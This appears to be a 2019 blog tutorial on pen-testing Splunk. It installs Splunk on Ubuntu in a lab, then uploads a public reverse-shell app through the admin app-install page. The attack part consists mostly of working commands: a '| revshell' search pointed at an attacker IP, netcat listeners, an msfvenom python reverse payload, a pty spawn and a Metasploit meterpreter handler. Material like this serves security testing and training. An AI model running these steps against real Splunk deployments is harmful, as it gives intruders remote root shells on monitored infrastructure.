<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Penetration Testing on Splunk</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/penetration-testing-on-splunk/" rel="bookmark"><time class="entry-date published updated" datetime="2019-06-10T10:54:35+00:00">June 10, 2019</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to exploit SPLUNK using the reverse shell. One can find this beneficial in exploiting and do penetration testing of SPLUNK environment of their respective IT infrastructure.</span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ul>
<li><span style="color: #000000;">Introduction to SPLUNK</span></li>
<li><span style="color: #000000;">Deploying SPLUNK on UBUNTU</span></li>
<li><span style="color: #000000;">Exploiting SPLUNK using a reverse shell</span></li>
</ul>
<h3><span style="color: #800000;"><strong>What is SPLUNK?</strong></span></h3>
<p><span style="color: #000000;">Splunk Enterprise Security (ES) is a security information and event management (SIEM) solution that provides insight into machine data generated from security technologies such as network, endpoint, access, malware, vulnerability and identity information. It is a premium application that is licensed independently from Splunk core.</span></p>
<p><span style="color: #000000;">Splunk (the product) captures, indexes, and correlates real-time data in a searchable repository from which it can generate graphs, reports, alerts, dashboards, and visualizations.</span></p>
<p><span style="color: #000000;">For more information read from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://en.wikipedia.org/wiki/Splunk">here</a></span></strong>.</span></p>
<h3><span style="color: #800000;"><strong>Deploying SPLUNK on UBUNTU</strong></span></h3>
<p><span style="color: #000000;">Now we will continue with penetration testing of SPLUNK on LINUX platform (here we are using UBUNTU), the same can be performed on the windows platform as well.</span></p>
<p><span style="color: #000000;">Visit <a style="color: #000000;" href="https://www.splunk.com/">https://www.splunk.com</a> and register there for downloading the free trial version of SPLUNK. Since we are going to continue with UBUNTU we have downloaded the Splunk for <em>Linux 64 bit</em> (.tgz file).</span></p>
<p><span style="color: #000000;">Once it gets downloaded on your UBUNTU machine, follow the process below for creating an instance of SPLUNK:</span></p>
<p><span style="color: #000000;">Open terminal, go to downloads and extract file using</span></p>
<pre class="lang:default decode:true">tar -zxfv  splunk-7.3.0-657388c7a488-Linux-x86_64.tgz</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Py0rJgUXOag/XP4zBfQTEoI/AAAAAAAAetU/TjywSwNW-hQ7WjQu_-bO6QQVw8TMBcbcQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now follow these commands for installing splunk:</span></p>
<pre class="lang:default decode:true">mv splunk /opt
cd /opt
cd splunk
cd bin/
/opt/splunk/bin/splunk start --accept-license</pre>
<p><span style="color: #000000;">When asked enter the username and password you need to configure for Splunk.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2W-3DHrC080/XP4zEdtfH2I/AAAAAAAAet4/i-CkGbk21Qwc4aO6t9-v8N-j1oqGjRoDwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Once done you should see the following screen with URL of your Splunk GUI</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ahrNNfiIqU0/XP4zFtLuzzI/AAAAAAAAeuI/3-zaJ85SZC49Gu3S17im5UGsrHAaoLcgwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Go to http://ubuntu:8000 (URL of your Splunk GUI) and enter the user id and password you configured earlier:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IQ6OMdbzUq4/XP4zGWHou8I/AAAAAAAAeuM/BhMG2LdWtBMNI5KOxzT_BCk3DGvjPNpWQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-siwjQyG7rfo/XP4zGvmylJI/AAAAAAAAeuU/OBPZ7jIvQKkJIYp1fC1lDqJKhTQwxPAhQCLcBGAs/s1600/5.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting SPLUNK using a reverse shell</strong></span></h3>
<p><span style="color: #000000;">In the first phase, we have discussed how we can deploy Splunk in our local machine (<u>Ubuntu</u>) and in this phase, we will go with Splunk penetration testing where we will try to exploit Splunk for obtaining reverse shell of the machine.</span></p>
<p><span style="color: #000000;">For exploiting Splunk first now download the latest released shell from the following the link:</span></p>
<pre class="lang:default decode:true">https://github.com/TBGSecurity/splunk_shells/archive/1.2.tar.gz</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--4a2S7kfGdk/XP4zGnIB1-I/AAAAAAAAeuQ/nGlnL0yi4IkQpUIDlwIu10kftCMIMcWxgCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now login to Splunk GUI from your kali machine visiting the IP of Ubuntu server: 8000 (192.168.0.37:8000) and login</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6MDxOmHH7sw/XP4zHlfhBEI/AAAAAAAAeuc/EgvIJH30wz8Pj2kRy740klxRj6JqZ8P0ACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Navigate to the “App: Search &amp; Reporting” option and click on “<strong>Search &amp; Reporting</strong>”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-51BStgaXpK0/XP4zHrgzP0I/AAAAAAAAeuY/FeKZ61mqeg4vPPIfUx4dnKA_04P9XMBNACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Click on the “Install app from file” option.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4ijmB5CdRLg/XP4zHlTLuOI/AAAAAAAAeug/g80bdKnxNY4NaqH3082TIDDGhPQndnjeACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">For installing any app slunk provides upload form to browse any .spl or .tar.gz for uploading. Taking advantages of functionality we will try to upload our Splunk shell that we had downloaded previously.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dKI-nIE6o9A/XP4zBRL-OCI/AAAAAAAAetQ/BH5UbKhHrA0r_5unCPwguK7eS7bLR11QACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">After uploading restart your Splunk instance.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UOR-W-JVQ7c/XP4zBccbKDI/AAAAAAAAetY/V1IHRZQa2TMp03-MRbUip1FpvciXzSVjQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Once restarted, go to apps tab again, Find your installed archive (weaponize Splunk for red teaming and pen testing)</span></p>
<p><span style="color: #000000;">We scroll down to find our shell file as shown below. Before we can run, it we need to click on the “Permissions” option to change its permissions.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NifDfu0szN8/XP4zCBcCAlI/AAAAAAAAetc/kc0zc3Zgh78HfPphKNklQLdHjOli9vIEQCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Click on permissions and change to all apps as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YKAirxpJM5E/XP4zCcmwAbI/AAAAAAAAetg/42bg2PIavoorgIBAEAWSRhoLU9cfumSfACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now to execute the shell. We navigate to the search option in Splunk and type in our command defining that we want a reverse shell of standard type to talk to out attach machines IP on the listening port.</span></p>
<pre class="lang:default decode:true">| revshell std 192.168.0.7 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q_g99TnYiUo/XP4zCgURJYI/AAAAAAAAetk/ykQsmLz43IQ1GhwcyZIZADUJqOZsZbiJACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now go to Kali Linux and open a terminal:</span></p>
<p><span style="color: #000000;">Start netcat using following command on any port you wish (here I have used 1234)</span></p>
<pre class="lang:default decode:true">nc -lvp 1234</pre>
<p><span style="color: #000000;">Hmmm!! As you can observe that by executing id command we show root uid and gid information but for obtaining proper tty shell we need to break jail.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lfe1fRmYVnw/XP4zDFfc12I/AAAAAAAAeto/sjbEqbxtemU5d2em4rnHuLKIiMTix_P_QCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">We used Msfvenom to create a python payload.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_python lhost=192.168.0.7 lport=4444 R</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U2JtB9my5FY/XP4zDtbVXvI/AAAAAAAAets/EFZ8UWlBW04KoQ3szhqbUJf4FwpNAqjZQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">The payload is uploaded through our existing Netcat session, all that needed to be done was the payload to be pasted into the terminal and executed but do not forget to run netcat listener inside a new terminal.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XBueg36Z0RM/XP4zD9B3KGI/AAAAAAAAetw/rlbfEBOIqIgqhguQZ3eZRx2B4_M-J7F9QCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">A new Netcat session is started on the port (4444) that we defined in our payload and we see the execution occur flawlessly. Once this netcat session is started run following command:</span></p>
<pre class="lang:default decode:true">python –c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">And after executing the command we can see that shell is gained.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--_lLJVIrIO4/XP4zEMluwFI/AAAAAAAAet0/n7ae7acPX-QURkXswOJfN9s2tWMkBtpBgCLcBGAs/s1600/19.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Meterpreter Session</span> </strong></span></h3>
<p><span style="color: #000000;">If you are hoping for a meterpreter session then you can use a multi handler for obtaining reverse connection of victim’s machine.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload python/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.0.7
msf exploit(multi/handler) &gt; set lport 9999
msf exploit(multi/handler) &gt; exploit-j</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iFPYCnH9PTA/XP4zEi_oA1I/AAAAAAAAet8/IQ3dath8FKUDYEcap1MZhxCqqoxJ_LW7wCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Type following to execute a reverse shell</span></p>
<pre class="lang:default decode:true">| revshell msf 192.168.0.7 9999</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-05VbYBcBYHc/XP4zE9Q0BrI/AAAAAAAAeuA/psAXAxEa3ggYnn6CgtgqJMvJ391HmrDKwCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Boooom!! We got the meterpreter session.</span></p>
<p><span style="color: #000000;">And in this way saw Splunk penetration testing </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7B1xU9GJvu8/XP4zFZ7i3FI/AAAAAAAAeuE/REq2likEC_kGTnLzC0jjA9xzOv_lRMZ2ACLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Shivendu Vikram Singh Cybersecurity engineer Working in TCS as a Pentester Contact <a href="http://linkedin.com/in/shivendu-vikram-singh-087322a7"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
